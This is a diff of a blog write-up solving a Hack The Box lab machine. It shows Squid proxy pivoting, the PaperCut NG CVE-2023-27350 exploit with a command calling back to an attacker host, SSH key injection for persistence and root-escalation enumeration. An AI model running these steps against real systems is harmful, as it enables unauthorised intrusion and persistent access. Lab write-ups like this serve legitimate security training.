@@ -7,7 +7,9 @@ TocOpen: true
 tags:
   - blog
   - HTB
-lastmod: 2026-03-22T19:55:21.343Z
+  - medium
+  - Linux
+lastmod: 2026-03-23T13:53:53.473Z
 ---
 # Box Info
 
@@ -15,20 +17,16 @@ lastmod: 2026-03-22T19:55:21.343Z
 
 ***
 
-Finally use the  `AutoHotkey` that will detect the tedsadsa@linux:~/ like that
+![Pasted image 20260323215352.png](/ob/Pasted%20image%2020260323215352.png)
 
-```
-tedsadsa@linux:~/Desktop$ whoami 
-```
+# Recon
 
-# Recon 10.129.234.X
-
-### \[\[PORT & IP SCAN]]
+### PORT & IP SCAN
 
 The `nmap` reveal that the machine has the port of 22 and 3128 for squid-http , remember to use the `--min-rate` , otherwise , the `nmap` scan can scan for 1 day
 
 ```
-test $ sudo nmap  -p-  -vv -reason -T 5  -o openPort.txt 10.129.238.16 --min-rate 500
+parallels@ubuntu-linux-2404:~/Desktop$ sudo nmap  -p-  -vv -reason -T 5  -o openPort.txt 10.129.238.16 --min-rate 500
 Nmap scan report for 10.129.238.16
 Host is up, received echo-reply ttl 63 (0.66s latency).
 Scanned at 2026-03-16 07:30:34 HKT for 395s
@@ -63,15 +61,15 @@ Nmap done: 1 IP address (1 host up) scanned in 45.47 seconds
            
 ```
 
-### SSH 22
+`3128` is the port which will use the proxy to arrive the internal network , normally it will be used for Filtering traffic (e.g., for parental controls or company policies), Controlling internet usage via ACLs (Access Control Lists).
 
-The SSH is the 3ubuntu0 for the Linux , nothing find in here
+Normally, the `Squid` can be Auth with password , but it don't do it ! ! !
 
-### 3128/tcp
+### 3128 tcp
 
-The (VerylazyTech)\[https://www.verylazytech.com/squid-port-3128] say that **Port 3128** is widely associated with **Squid**, a caching and forwarding HTTP web proxy. While it can improve performance and control web access, misconfigured instances can expose systems to security vulnerabilities. In this article, we’ll explore how to identify, assess, and safely exploit Squid proxies during a penetration test—strictly in authorized environments.
+The [VerylazyTech](https://www.verylazytech.com/squid-port-3128) say that **Port 3128** is widely associated with **Squid**, a caching and forwarding HTTP web proxy. While it can improve performance and control web access, misconfigured instances can expose systems to security vulnerabilities. In this article, we’ll explore how to identify, assess, and safely exploit Squid proxies during a penetration test—strictly in authorized environments.
 
-Base on HackTrick\[https://hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html] to pentest it
+[HackTrick](https://hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html) has the good reference to step by step to pen-test it
 
 ```
 tester@linux$ git clone https://github.com/aancw/spose.git
@@ -95,6 +93,10 @@ localhost:9192 seems OPEN
 localhost:9195 seems OPEN
 ```
 
+The port of `22`,`9191`,`9192`,`9195` are opened but it only can be viewed by proxy
+
+Thereforce , i will add the http proxy to proxychains.conf
+
 **Proxychains for HTTP interaction:** append a strict HTTP entry at the bottom of `/etc/proxychains.conf`:
 
 ```shell
@@ -105,6 +107,8 @@ http    10.129.238.16   3128
 ![Pasted image 20260321124035.png](/ob/Pasted%20image%2020260321124035.png)
 
 Then interact with internal listeners (e.g., a web UI bound to 127.0.0.1) transparently through Squid:
+
+Successfully request the 9191 by `proxychains` , but it return to 301 , if i want to see what is it , then I need to check it in browser .
 
 ```AutoHotkey
 $ proxychains curl http://127.0.0.1:9191 -v
@@ -129,21 +133,37 @@ $ proxychains curl http://127.0.0.1:9191 -v
 * Connection #0 to host 127.0.0.1:9191 left intact
 ```
 
-I already have my [Firefox set up with FoxyProxy](https://www.youtube.com/watch?v=iTm33Miymdg) to proxy all my CTF traffic through Burp. I’ll go into Burp –> Proxy –> Settings –> Network –> Connections –> Upstream proxy servers and add this Squid instance:
+The `proxychain` with `curl` is success , but i want to check the UI.
+
+Use the Burpsuite 's Upstream proxy servers that will enable me to go to the `9191` 's web UI
 
 ![Pasted image 20260321124926.png](/ob/Pasted%20image%2020260321124926.png)
 
+Proxy host set to be machine IP\
+Proxy port will be 3128 the nmap scaned port\
 ![Pasted image 20260321125201.png](/ob/Pasted%20image%2020260321125201.png)
+
+In the `burp` need to `Open browser`  which is default closed , you need to turn it on.
+
+# Shell as papercut
+
+### POC
+
+`http://127.0.0.1:9191` will redirect to `http://127.0.0.1:9191/user`
 
 ![Pasted image 20260321130822.png](/ob/Pasted%20image%2020260321130822.png)
 
-Let me find the `PaperCut NG 22.0` ' s CVE
+The UI show the the web version and CMS version
 
-https://github.com/horizon3ai/CVE-2023-27350\
-POC\
+`PaperCut NG 22.0`
+
+The [horizon3ai](https://github.com/horizon3ai/CVE-2023-27350) has the good python POC to do it , but you need to review what is the code is doing
+
 ![Pasted image 20260321133135.png](/ob/Pasted%20image%2020260321133135.png)
 
-```AutoHotkey
+`proxychains` with `-q` to run the POC
+
+```
 tester@linux$ proxychains -q  python3 CVE-2023-27350.py.1 -u http://127.0.0.1:9191/ -c 'curl http://10.10.16.4'
 [*] Papercut instance is vulnerable! Obtained valid JSESSIONID
 [*] Updating print-and-device.script.enabled to Y
@@ -154,15 +174,17 @@ tester@linux$ proxychains -q  python3 CVE-2023-27350.py.1 -u http://127.0.0.1:91
 [*] Updating print.script.sandboxed to Y
 ```
 
+Open the http server for POC
+
 ```AutoHotkey
 tester@linux$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.238.16 - - [21/Mar/2026 13:29:25] "GET / HTTP/1.1" 200 -
 ```
 
-```shell
-python3 -m http.server 80
-```
+### Revshell
+
+Download the revshell script first , and then run the rveshell script for solve the problem of the web dont have the access to directly run the code
 
 Create the shell
 
@@ -201,6 +223,12 @@ tester@linux$ proxychains -q  python3 CVE-2023-27350.py.1 -u http://127.0.0.1:91
 [*] Updating print.script.sandboxed to Y
 ```
 
+After own the user in the shell , i would like to have the ssh for more stable login
+
+### SSH Authorized Keys Injection (T1098.004)
+
+use the `ssh-keygen` to have the private key and public key in the `~/.ssh`
+
 ```shell
 tester@linux$ ssh-keygen -t ed25519 -C "haydon@kali-$(date +%Y%m%d)"
 Generating public/private ed25519 key pair.
@@ -213,7 +241,7 @@ Your identification has been saved in /home/parallels/.ssh/id_ed25519
 Your public key has been saved in /home/parallels/.ssh/id_ed25519.pub
 The key fingerprint is:
 SHA256:/zNh5RrEzhD4IfFZr3NYShyBgaVUzgiukplJs7Xt8Mo haydon@kali-20260321
-The key's randomart image is:
+ 
 +--[ED25519 256]--+
 |      . o*+o+.   |
 |     . o+*++ o   |
@@ -227,6 +255,8 @@ The key's randomart image is:
 +----[SHA256]-----+
 ```
 
+`cat` the public key within here is id\_ed25519.pub for copy-and-paste to target shell
+
 ```shell
 tester@linux$ ls ~/.ssh                                                           
 id_ed25519  id_ed25519.pub
@@ -238,14 +268,18 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKM1/F1Xu38W1tZp67JhMCEUxH6ati6tvd850oRkaZeV
 
 ```
 
+back the bamboo shell , `echo` the key to the new file `authorized_keys`
+
 ```
-tester@linux$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKM1/F1Xu38W1tZp67JhMCEUxH6ati6tvd850oRkaZeV haydon@kali-20260321' > authorized_keys
+papercut@bamboo:~/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKM1/F1Xu38W1tZp67JhMCEUxH6ati6tvd850oRkaZeV haydon@kali-20260321' > authorized_keys
 <d850oRkaZeV haydon@kali-20260321' > authorized_keys
 papercut@bamboo:~/.ssh$ ls
 ls
 authorized_keys
 papercut@bamboo:~/.ssh$ 
 ```
+
+Once inject the public key , that will enable to login the ssh
 
 ```
 tester@linux$ ssh -i ~/.ssh/id_ed25519 papercut@10.129.238.16       
@@ -286,7 +320,22 @@ papercut@bamboo:~$
 
 ```
 
+# Shell as Root
+
 ### Enumeration
+
+Users identify
+
+found the `root` , `ubuntu` , `papercut`
+
+```
+papercut@bamboo:~$ cat /etc/passwd | grep 'sh$'
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+papercut:x:1001:1001:,,,:/home/papercut:/bin/bash
+```
+
+Try to run the `pspy64` when i dont have any idea
 
 ```
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
@@ -295,16 +344,68 @@ python3 -m http.server 80
 
 ```
 
-```AutoHotkey
+high recommand to know what command is runed by `root`
 
-Last login: Sat Mar 21 06:13:12 2026 from 10.10.16.4
-papercut@bamboo:~$ 
-papercut@bamboo:~$ 
-papercut@bamboo:~$ 
-papercut@bamboo:~$ ls
-LICENCE.TXT                  client     pspy64   server     yes
-README-LINUX.TXT             docs       release  uninstall  yes.pub
-THIRDPARTYLICENSEREADME.TXT  providers  runtime  user.txt
+server-command can be runned by root
+
+dont recommand to  ask the AI , AI say dont have it ...
+
+```
+papercut@bamboo:~/server/bin/linux-x64$ ls -al 
+total 13128
+drwxr-xr-x 3 papercut papercut     4096 May 26  2023 .
+drwx------ 3 papercut papercut     4096 Sep 29  2022 ..
+-rw-r--r-- 1 papercut papercut     1522 Sep 29  2022 .common
+-rwxr-xr-x 1 papercut papercut   111027 Sep 29  2022 app-monitor
+-rw-r--r-- 1 papercut papercut     5514 Sep 29  2022 app-monitor.conf
+-rwxr-xr-x 1 papercut papercut    16658 Sep 29  2022 app-server
+-r-s--x--x 1 root     root        11071 Sep 29  2022 authpam
+-rwxr-xr-x 1 papercut papercut     2456 Sep 29  2022 authsamba
+-rwxr-xr-x 1 papercut papercut      479 Sep 29  2022 create-client-config-file
+-rwxr-xr-x 1 papercut papercut      468 Sep 29  2022 create-ssl-keystore
+-rwxr-xr-x 1 papercut papercut      763 Sep 29  2022 db-tools
+-rwxr-xr-x 1 papercut papercut      501 Sep 29  2022 direct-print-monitor-config-initializer
+-rwxr-xr-x 1 papercut papercut     2306 Sep 29  2022 gather-ldap-settings
+drwxr-xr-x 2 papercut papercut     4096 May 26  2023 lib
+-rwxr-xr-x 1 papercut papercut   493309 Sep 29  2022 pc-pdl-to-image
+-rwxr-xr-x 1 papercut papercut 12689408 Sep 29  2022 pc-split-scan
+-rwxr-xr-x 1 papercut papercut     9558 Sep 29  2022 pc-udp-redirect
+-rwxr-xr-x 1 papercut papercut     7561 Sep 29  2022 roottasks
+-rwxr-xr-x 1 papercut papercut     7777 Sep 29  2022 sambauserdir
+-rwxr-xr-x 1 papercut papercut      493 Sep 29  2022 server-command
+-rwxr-xr-x 1 papercut papercut     2253 Sep 29  2022 setperms
+-rwxr-xr-x 1 papercut papercut      286 Sep 29  2022 start-server
+-rwxr-xr-x 1 papercut papercut    11108 Sep 29  2022 stduserdir
+-rwxr-xr-x 1 papercut papercut      279 Sep 29  2022 stop-server
+-rwxr-xr-x 1 papercut papercut      480 Sep 29  2022 upgrade-server-configuration
+papercut@bamboo:~/server/bin/linux-x64$ 
+
+```
+
+Always to find the `password` in command line arguments , `backup.sh`, ignore the following list
+
+/usr/sbin/squid --> squid\
+../runtime/linux-x64/ --> Microsoft ASP.NET\
+/usr/sbin/chronyd --> system time control\
+v2023-02-14-1341/pc-print-deploy-server --> [PaperCut Print Deploy Security Bulletin](https://www.papercut.com/kb/Main/papercut-ng-mf-security-bulletin-september-2025/) The hint of printer exploit\
+/lib/systemd/systemd-logind  -->
+
+***
+
+/usr/sbin/acpid\
+/sbin/dhclient\
+/usr/local/sbin/laurel\
+/sbin/auditd\
+/usr/bin/vmtoolsd\
+/usr/bin/VGAuthService\
+/lib/systemd/systemd-resolved\
+/lib/systemd/systemd-udevd\
+/sbin/multipathd\
+/lib/systemd/systemd-journald\
+/usr/lib/x86\_64-linux-gnu/gconv/gconv-modules.cache
+
+```
+papercut@bamboo:~$ chmod +x pspy64
 papercut@bamboo:~$ timeout  120 ./pspy64  -pf -i 1000
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
 
@@ -1378,11 +1479,15 @@ go to get http://127.0.0.1:9191/app?service=page/SetupCompleted
 
 ![Pasted image 20260321151102.png](/ob/Pasted%20image%2020260321151102.png)
 
+server-command is owned by root to run
+
 ```
 2026/03/21 07:13:34 CMD: UID=0     PID=38105  | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key 
 ```
 
 To exploit this is simple. papercut controls that directory and binary:
+
+high recommand to know what command is runed by `root`
 
 ```
 papercut@bamboo:~/server/bin/linux-x64$ ls -al 
